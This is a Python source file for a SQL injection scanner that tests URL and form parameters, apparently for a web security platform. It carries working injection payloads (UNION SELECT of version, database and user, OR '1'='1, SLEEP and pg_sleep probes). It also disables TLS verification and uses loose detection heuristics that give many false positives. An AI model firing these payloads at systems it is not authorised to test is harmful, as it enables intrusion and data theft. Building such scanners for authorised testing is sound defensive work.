"""
SQL Injection Scanner - Concrete implementation
Based on DVWA analysis findings and BaseScanner patterns
"""

import asyncio
import json
import re
import time
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse, urlencode
import httpx

from app.config.logging import get_logger
from app.config.settings import settings
from app.models.vulnerability import VulnerabilityType, VulnerabilityRisk
from .base import BaseScanner


class SQLInjectionScanner(BaseScanner):
    """
    Concrete SQL Injection Scanner implementation
    Based on DVWA analysis findings and existing codebase patterns
    """
    
    def __init__(self):
        super().__init__()
        self.logger = get_logger("scanner.sql_injection")
        self.payloads = self._load_sql_payloads()
        self.error_patterns = getattr(settings, 'SQLI_ERROR_PATTERNS', [
            r"SQL syntax.*error",
            r"mysqli_sql_exception",
            r"You have an error in your SQL syntax",
            r"Warning: mysql_",
            r"mysql_fetch_array",
            r"mysql_num_rows",
            r"ORA-01756",
            r"Microsoft OLE DB Provider"
        ])
        
    def _load_sql_payloads(self) -> List[Dict[str, Any]]:
        """
        Load SQL injection payloads based on DVWA analysis findings
        """
        return [
            # Error-based payloads
            {
                'name': 'Single Quote Error Test',
                'payload': "'",
                'type': 'error_based',
                'risk': VulnerabilityRisk.HIGH,
                'description': 'Basic single quote to trigger SQL syntax error'
            },
            {
                'name': 'Double Quote Error Test', 
                'payload': '"',
                'type': 'error_based',
                'risk': VulnerabilityRisk.HIGH,
                'description': 'Double quote to trigger SQL syntax error'
            },
            
            # Boolean-based payloads
            {
                'name': 'Boolean OR True',
                'payload': "1' OR '1'='1",
                'type': 'boolean_based',
                'risk': VulnerabilityRisk.HIGH,
                'description': 'Boolean-based injection with always true condition'
            },
            {
                'name': 'Boolean AND True',
                'payload': "1' AND '1'='1",
                'type': 'boolean_based', 
                'risk': VulnerabilityRisk.MEDIUM,
                'description': 'Boolean-based injection with true condition'
            },
            {
                'name': 'Boolean AND False',
                'payload': "1' AND '1'='2",
                'type': 'boolean_based',
                'risk': VulnerabilityRisk.MEDIUM,
                'description': 'Boolean-based injection with false condition'
            },
            
            # Union-based payloads
            {
                'name': 'Union Select Version',
                'payload': "1' UNION SELECT null,version()--",
                'type': 'union_based',
                'risk': VulnerabilityRisk.CRITICAL,
                'description': 'Union-based injection to extract database version'
            },
            {
                'name': 'Union Select Database',
                'payload': "1' UNION SELECT null,database()--",
                'type': 'union_based',
                'risk': VulnerabilityRisk.CRITICAL,
                'description': 'Union-based injection to extract database name'
            },
            {
                'name': 'Union Select User',
                'payload': "1' UNION SELECT null,user()--",
                'type': 'union_based',
                'risk': VulnerabilityRisk.CRITICAL,
                'description': 'Union-based injection to extract database user'
            },
            
            # Time-based payloads
            {
                'name': 'Time-based Blind MySQL',
                'payload': "1' AND SLEEP(5)--",
                'type': 'time_based',
                'risk': VulnerabilityRisk.HIGH,
                'description': 'Time-based blind injection using SLEEP function'
            },
            {
                'name': 'Time-based Blind PostgreSQL',
                'payload': "1'; SELECT pg_sleep(5)--",
                'type': 'time_based',
                'risk': VulnerabilityRisk.HIGH,
                'description': 'Time-based blind injection for PostgreSQL'
            }
        ]
    
    async def scan(self, target_url: str, **kwargs) -> Dict[str, Any]:
        """
        Perform comprehensive SQL injection scan
        Following existing BaseScanner patterns
        """
        
        self.logger.info(f"Starting SQL injection scan for: {target_url}")
        
        scan_results = {
            'target_url': target_url,
            'scan_type': 'sql_injection',
            'vulnerabilities': [],
            'scan_summary': {
                'total_tests': 0,
                'vulnerabilities_found': 0,
                'critical_count': 0,
                'high_count': 0,
                'medium_count': 0
            },
            'scan_metadata': {
                'start_time': time.time(),
                'end_time': None,
                'duration': None,
                'parameters_tested': []
            }
        }
        
        try:
            # Extract parameters from URL
            parameters = self._extract_parameters(target_url)
            scan_results['scan_metadata']['parameters_tested'] = list(parameters.keys())
            
            if not parameters:
                self.logger.warning(f"No parameters found in URL: {target_url}")
                return scan_results
            
            # Test each parameter with each payload
            for param_name, param_value in parameters.items():
                self.logger.info(f"Testing parameter: {param_name}")
                
                for payload_info in self.payloads:
                    scan_results['scan_summary']['total_tests'] += 1
                    
                    vulnerability = await self._test_sql_injection(
                        target_url, param_name, param_value, payload_info
                    )
                    
                    if vulnerability:
                        scan_results['vulnerabilities'].append(vulnerability)
                        scan_results['scan_summary']['vulnerabilities_found'] += 1
                        
                        # Count by risk level
                        if vulnerability['risk'] == VulnerabilityRisk.CRITICAL.value:
                            scan_results['scan_summary']['critical_count'] += 1
                        elif vulnerability['risk'] == VulnerabilityRisk.HIGH.value:
                            scan_results['scan_summary']['high_count'] += 1
                        elif vulnerability['risk'] == VulnerabilityRisk.MEDIUM.value:
                            scan_results['scan_summary']['medium_count'] += 1
                        
                        self.logger.warning(f"SQL injection vulnerability found: {vulnerability['title']}")
            
            # Finalize scan metadata
            scan_results['scan_metadata']['end_time'] = time.time()
            scan_results['scan_metadata']['duration'] = (
                scan_results['scan_metadata']['end_time'] - 
                scan_results['scan_metadata']['start_time']
            )
            
            self.logger.info(
                f"SQL injection scan completed. Found {scan_results['scan_summary']['vulnerabilities_found']} "
                f"vulnerabilities in {scan_results['scan_metadata']['duration']:.2f} seconds"
            )
            
            return scan_results
            
        except Exception as e:
            self.logger.error(f"Error during SQL injection scan: {str(e)}")
            scan_results['error'] = str(e)
            return scan_results
    
    def _extract_parameters(self, url: str) -> Dict[str, str]:
        """
        Extract parameters from URL and discover form parameters
        Enhanced to support auto-discovery of form inputs
        """
        parameters = {}

        try:
            # 1. Extract GET parameters from URL query string
            parsed_url = urlparse(url)
            url_params = parse_qs(parsed_url.query)

            # Convert list values to single values
            for key, values in url_params.items():
                parameters[key] = values[0] if values else ''

            # 2. If no URL parameters found, try to discover form parameters
            if not parameters:
                self.logger.info(f"No URL parameters found, attempting form discovery for: {url}")
                form_params = self._discover_form_parameters(url)
                parameters.update(form_params)

            self.logger.info(f"Extracted {len(parameters)} parameters: {list(parameters.keys())}")
            return parameters

        except Exception as e:
            self.logger.error(f"Error extracting parameters from URL {url}: {str(e)}")
            return {}

    def _discover_form_parameters(self, url: str) -> Dict[str, str]:
        """
        Discover form parameters by parsing HTML content
        Auto-detect input fields that can be tested for SQL injection
        """
        try:
            import httpx
            from bs4 import BeautifulSoup

            self.logger.info(f"Attempting to discover form parameters from: {url}")

            # Make request to get HTML content using httpx
            with httpx.Client(timeout=10, verify=False) as client:
                response = client.get(url)
                response.raise_for_status()

                # Parse HTML content
                soup = BeautifulSoup(response.content, 'html.parser')
                parameters = {}

                # Find all forms
                forms = soup.find_all('form')
                self.logger.info(f"Found {len(forms)} forms on the page")

                for form in forms:
                    # Get form action and method
                    action = form.get('action', '')
                    method = form.get('method', 'get').lower()

                    # Find all input fields
                    inputs = form.find_all(['input', 'select', 'textarea'])

                    for input_field in inputs:
                        name = input_field.get('name')
                        input_type = input_field.get('type', 'text').lower()
                        value = input_field.get('value', '')

                        if name and input_type not in ['submit', 'button', 'reset', 'file']:
                            # Use default test values for different input types
                            if input_type in ['text', 'search', 'url']:
                                parameters[name] = value or '1'  # Default test value
                            elif input_type == 'hidden':
                                parameters[name] = value or 'test'
                            elif input_type == 'number':
                                parameters[name] = value or '1'
                            else:
                                parameters[name] = value or 'test'

                            self.logger.info(f"Discovered parameter: {name} = {parameters[name]}")

                # If no form parameters found, try common parameter names
                if not parameters:
                    self.logger.info("No form parameters found, trying common parameter names")
                    common_params = ['id', 'user', 'search', 'q', 'query', 'name', 'username']
                    for param in common_params:
                        parameters[param] = '1'  # Default test value
                        self.logger.info(f"Added common parameter: {param} = 1")

                return parameters

        except Exception as e:
            self.logger.warning(f"Could not discover form parameters from {url}: {str(e)}")
            # Fallback: return common parameters for testing
            return {'id': '1', 'user': 'test'}

    async def _test_sql_injection(
        self, 
        base_url: str, 
        param_name: str, 
        original_value: str,
        payload_info: Dict[str, Any]
    ) -> Optional[Dict[str, Any]]:
        """
        Test individual SQL injection payload
        Following existing error handling patterns
        """
        
        try:
            # Get baseline response first
            baseline_response = await self._make_baseline_request(base_url, param_name, original_value)
            if not baseline_response:
                return None
            
            # Test with malicious payload
            malicious_response = await self._make_malicious_request(
                base_url, param_name, payload_info['payload']
            )
            if not malicious_response:
                return None
            
            # Analyze responses for vulnerability
            vulnerability = await self._analyze_responses(
                baseline_response, malicious_response, payload_info, base_url, param_name
            )

            # Enhanced logging for debugging (fix Unicode error)
            if vulnerability:
                self.logger.info(f"[SUCCESS] Vulnerability detected: {payload_info['name']} on parameter '{param_name}' with confidence {vulnerability.get('confidence', 0)}")
            else:
                self.logger.debug(f"[FAIL] No vulnerability detected: {payload_info['name']} on parameter '{param_name}'")

            return vulnerability
            
        except Exception as e:
            self.logger.error(f"Error testing SQL injection payload {payload_info['name']}: {str(e)}")
            return None
    
    async def _make_baseline_request(
        self, base_url: str, param_name: str, param_value: str
    ) -> Optional[Dict[str, Any]]:
        """
        Make baseline request with original parameter value
        """
        try:
            # Build URL with original parameter
            url = self._build_url_with_param(base_url, param_name, param_value)
            
            start_time = time.time()
            response = await self._make_request(url, timeout=self.session_timeout)
            end_time = time.time()
            
            if response:
                return {
                    'content': response.text,
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'response_time': end_time - start_time,
                    'content_length': len(response.text)
                }
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error making baseline request: {str(e)}")
            return None
    
    async def _make_malicious_request(
        self, base_url: str, param_name: str, payload: str
    ) -> Optional[Dict[str, Any]]:
        """
        Make request with malicious SQL injection payload
        """
        try:
            # Build URL with malicious payload
            url = self._build_url_with_param(base_url, param_name, payload)
            
            start_time = time.time()
            response = await self._make_request(url, timeout=self.session_timeout)
            end_time = time.time()
            
            if response:
                return {
                    'content': response.text,
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'response_time': end_time - start_time,
                    'content_length': len(response.text),
                    'payload': payload
                }
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error making malicious request with payload {payload}: {str(e)}")
            return None
    
    def _build_url_with_param(self, base_url: str, param_name: str, param_value: str) -> str:
        """
        Build URL with specific parameter value
        """
        try:
            parsed_url = urlparse(base_url)
            query_params = parse_qs(parsed_url.query)
            
            # Update the specific parameter
            query_params[param_name] = [param_value]
            
            # Rebuild URL
            new_query = urlencode(query_params, doseq=True)
            new_url = urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
            
            return new_url
            
        except Exception as e:
            self.logger.error(f"Error building URL with parameter: {str(e)}")
            return base_url

    async def _analyze_responses(
        self,
        baseline_response: Dict[str, Any],
        malicious_response: Dict[str, Any],
        payload_info: Dict[str, Any],
        base_url: str,
        param_name: str
    ) -> Optional[Dict[str, Any]]:
        """
        Analyze baseline and malicious responses to detect SQL injection
        Based on DVWA analysis findings
        """

        try:
            injection_type = payload_info['type']
            is_vulnerable = False
            confidence = 0.0
            evidence = {}

            # Error-based detection
            if injection_type == 'error_based':
                is_vulnerable, confidence, evidence = self._detect_error_based(
                    baseline_response, malicious_response
                )

            # Boolean-based detection
            elif injection_type == 'boolean_based':
                is_vulnerable, confidence, evidence = self._detect_boolean_based(
                    baseline_response, malicious_response, payload_info
                )

            # Union-based detection
            elif injection_type == 'union_based':
                is_vulnerable, confidence, evidence = self._detect_union_based(
                    baseline_response, malicious_response, payload_info
                )

            # Time-based detection
            elif injection_type == 'time_based':
                is_vulnerable, confidence, evidence = self._detect_time_based(
                    baseline_response, malicious_response
                )

            # If vulnerability detected, create vulnerability record
            # Lower threshold to detect more potential vulnerabilities
            confidence_threshold = getattr(settings, 'SCANNER_CONFIDENCE_THRESHOLD', 0.5)
            if is_vulnerable and confidence >= confidence_threshold:
                return {
                    'title': f"SQL Injection - {payload_info['name']}",
                    'description': payload_info['description'],
                    'vulnerability_type': self._map_injection_type_to_vuln_type(injection_type),
                    'risk': payload_info['risk'].value,
                    'endpoint': base_url,
                    'parameter': param_name,
                    'method': 'GET',
                    'payload': payload_info['payload'],
                    'confidence': confidence,
                    'evidence': evidence,
                    'request_data': {
                        'url': base_url,
                        'parameter': param_name,
                        'payload': payload_info['payload']
                    },
                    'response_data': {
                        'baseline_status': baseline_response['status_code'],
                        'malicious_status': malicious_response['status_code'],
                        'baseline_length': baseline_response['content_length'],
                        'malicious_length': malicious_response['content_length'],
                        'response_time_diff': malicious_response['response_time'] - baseline_response['response_time']
                    }
                }

            return None

        except Exception as e:
            self.logger.error(f"Error analyzing responses: {str(e)}")
            return None

    def _detect_error_based(
        self, baseline_response: Dict[str, Any], malicious_response: Dict[str, Any]
    ) -> Tuple[bool, float, Dict[str, Any]]:
        """
        Detect error-based SQL injection
        Based on DVWA error patterns analysis
        """

        try:
            malicious_content = malicious_response['content'].lower()
            evidence = {'detected_errors': []}

            # Check for SQL error patterns
            for pattern in self.error_patterns:
                if re.search(pattern.lower(), malicious_content):
                    evidence['detected_errors'].append(pattern)

            # Check for status code changes indicating errors
            status_changed = (
                malicious_response['status_code'] != baseline_response['status_code'] and
                malicious_response['status_code'] >= 500
            )

            # Enhanced detection: Check for any response differences that might indicate SQL injection
            baseline_content = baseline_response['content'].lower()
            content_length_diff = abs(len(malicious_content) - len(baseline_content))

            # Check for common SQL injection indicators in response
            sql_indicators = [
                'syntax error', 'mysql', 'sql', 'database', 'table', 'column',
                'select', 'union', 'where', 'from', 'error', 'warning'
            ]

            indicator_found = False
            for indicator in sql_indicators:
                if indicator in malicious_content and indicator not in baseline_content:
                    evidence['detected_errors'].append(f"SQL indicator: {indicator}")
                    indicator_found = True

            if evidence['detected_errors'] or status_changed or indicator_found or content_length_diff > 50:
                if evidence['detected_errors']:
                    confidence = 0.9
                elif status_changed:
                    confidence = 0.7
                elif indicator_found:
                    confidence = 0.6
                else:
                    confidence = 0.5  # Content length difference

                evidence.update({
                    'baseline_status': baseline_response['status_code'],
                    'malicious_status': malicious_response['status_code'],
                    'error_in_response': bool(evidence['detected_errors']),
                    'content_length_diff': content_length_diff,
                    'sql_indicators_found': indicator_found
                })
                return True, confidence, evidence

            return False, 0.0, {}

        except Exception as e:
            self.logger.error(f"Error in error-based detection: {str(e)}")
            return False, 0.0, {}

    def _detect_boolean_based(
        self,
        baseline_response: Dict[str, Any],
        malicious_response: Dict[str, Any],
        payload_info: Dict[str, Any]
    ) -> Tuple[bool, float, Dict[str, Any]]:
        """
        Detect boolean-based SQL injection
        Based on DVWA response analysis
        """

        try:
            baseline_length = baseline_response['content_length']
            malicious_length = malicious_response['content_length']

            # Calculate content length difference
            length_diff = abs(malicious_length - baseline_length)
            length_ratio = malicious_length / baseline_length if baseline_length > 0 else 0

            evidence = {
                'baseline_length': baseline_length,
                'malicious_length': malicious_length,
                'length_difference': length_diff,
                'length_ratio': length_ratio
            }

            # For OR-based payloads, expect significantly more content
            if "OR" in payload_info['payload'] and "1'='1" in payload_info['payload']:
                if length_ratio > 1.5:  # 50% more content
                    return True, 0.8, evidence
                elif length_diff > 10:  # Absolute difference check as fallback
                    return True, 0.7, evidence

            # For AND-based payloads, compare with expected behavior
            elif "AND" in payload_info['payload']:
                if "1'='1" in payload_info['payload']:
                    # Should be similar to baseline
                    if length_ratio > 0.8 and length_ratio < 1.2:
                        return True, 0.7, evidence
                elif "1'='2" in payload_info['payload']:
                    # Should be significantly different (less content)
                    if length_ratio < 0.5:
                        return True, 0.7, evidence

            return False, 0.0, evidence

        except Exception as e:
            self.logger.error(f"Error in boolean-based detection: {str(e)}")
            return False, 0.0, {}

    def _detect_union_based(
        self,
        baseline_response: Dict[str, Any],
        malicious_response: Dict[str, Any],
        payload_info: Dict[str, Any]
    ) -> Tuple[bool, float, Dict[str, Any]]:
        """
        Detect union-based SQL injection
        Based on DVWA union injection analysis
        """

        try:
            malicious_content = malicious_response['content'].lower()
            evidence = {'detected_data': []}

            # Check for database information disclosure
            union_indicators = [
                'mysql',
                'version()',
                'database()',
                'user()',
                'information_schema',
                'table_name',
                'column_name'
            ]

            for indicator in union_indicators:
                if indicator in malicious_content:
                    evidence['detected_data'].append(indicator)

            # Check for typical database version patterns
            version_patterns = [
                r'\d+\.\d+\.\d+',  # Version numbers like 5.7.34
                r'mariadb',
                r'mysql'
            ]

            for pattern in version_patterns:
                if re.search(pattern, malicious_content):
                    evidence['detected_data'].append(f"version_pattern: {pattern}")

            # Enhanced union detection: Check for response differences
            baseline_length = baseline_response['content_length']
            malicious_length = malicious_response['content_length']
            length_diff = abs(malicious_length - baseline_length)

            # Check for any significant response changes that might indicate union success
            significant_change = (
                length_diff > 20 or  # Significant content change
                malicious_response['status_code'] != baseline_response['status_code'] or
                'null' in malicious_content  # Union often returns null values
            )

            if evidence['detected_data'] or significant_change:
                if evidence['detected_data']:
                    confidence = 0.9
                elif significant_change:
                    confidence = 0.6  # Lower confidence for response changes
                else:
                    confidence = 0.5

                evidence.update({
                    'union_payload': payload_info['payload'],
                    'data_extracted': bool(evidence['detected_data']),
                    'response_change_detected': significant_change,
                    'length_difference': length_diff
                })
                return True, confidence, evidence

            return False, 0.0, {}

        except Exception as e:
            self.logger.error(f"Error in union-based detection: {str(e)}")
            return False, 0.0, {}

    def _detect_time_based(
        self, baseline_response: Dict[str, Any], malicious_response: Dict[str, Any]
    ) -> Tuple[bool, float, Dict[str, Any]]:
        """
        Detect time-based SQL injection
        Based on DVWA time delay analysis
        """

        try:
            baseline_time = baseline_response['response_time']
            malicious_time = malicious_response['response_time']
            time_diff = malicious_time - baseline_time

            evidence = {
                'baseline_time': baseline_time,
                'malicious_time': malicious_time,
                'time_difference': time_diff
            }

            # Enhanced time-based detection with multiple thresholds
            if time_diff > 4.0:  # 5 seconds minus tolerance - high confidence
                confidence = 0.9
                evidence['time_delay_detected'] = True
                evidence['delay_type'] = 'significant'
                return True, confidence, evidence
            elif time_diff > 2.0:  # 2+ seconds delay - medium confidence
                confidence = 0.7
                evidence['time_delay_detected'] = True
                evidence['delay_type'] = 'moderate'
                return True, confidence, evidence
            elif time_diff > 1.0:  # 1+ second delay - low confidence
                confidence = 0.5
                evidence['time_delay_detected'] = True
                evidence['delay_type'] = 'minor'
                return True, confidence, evidence

            return False, 0.0, {}

        except Exception as e:
            self.logger.error(f"Error in time-based detection: {str(e)}")
            return False, 0.0, {}

    def _map_injection_type_to_vuln_type(self, injection_type: str) -> str:
        """
        Map injection type to VulnerabilityType enum value
        """
        type_mapping = {
            'error_based': VulnerabilityType.ERROR_BASED_SQLI.value,
            'union_based': VulnerabilityType.UNION_BASED_SQLI.value,
            'boolean_based': VulnerabilityType.BOOLEAN_BLIND_SQLI.value,
            'time_based': VulnerabilityType.TIME_BASED_SQLI.value
        }

        return type_mapping.get(injection_type, VulnerabilityType.SQL_INJECTION.value)
